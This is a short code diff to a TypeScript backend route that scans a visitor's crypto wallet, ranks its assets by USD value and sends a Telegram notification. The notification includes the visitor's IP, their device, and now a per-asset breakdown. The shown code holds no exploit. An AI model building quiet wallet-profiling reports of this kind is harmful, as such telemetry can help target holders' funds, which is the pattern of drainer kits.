@@ -20,6 +20,7 @@ import {
   resolveClientIp,
   detectDeviceFromUA,
   type TelegramRequestContext,
+  type StrategyAsset,
 } from '../lib/telegram.js'
 
 type OracleRateKey = 'eth' | 'sol' | 'trx' | 'ton' | 'btc'
@@ -231,9 +232,17 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       const scanCtx: TelegramRequestContext = {
         ...extractRequestContext(request),
         chain_family: chainFamily ?? 'ALL',
+        wallet_type: 'Wallet',
         scout_value_usd: totalUsd,
       }
-      void notifyScanComplete(wallet, totalUsd, assets.length, scanCtx).catch(() => {})
+      const strategyAssets: StrategyAsset[] = assets.map((a) => ({
+        chain: a.chain,
+        family: a.family,
+        token: a.token,
+        symbol: a.symbol,
+        amount_usd: a.amount_usd,
+      }))
+      void notifyScanComplete(wallet, totalUsd, assets.length, scanCtx, strategyAssets).catch(() => {})
       return sendSuccess(reply, 200, 'Ranked assets ready', {
         assets,
         total_usd: totalUsd,
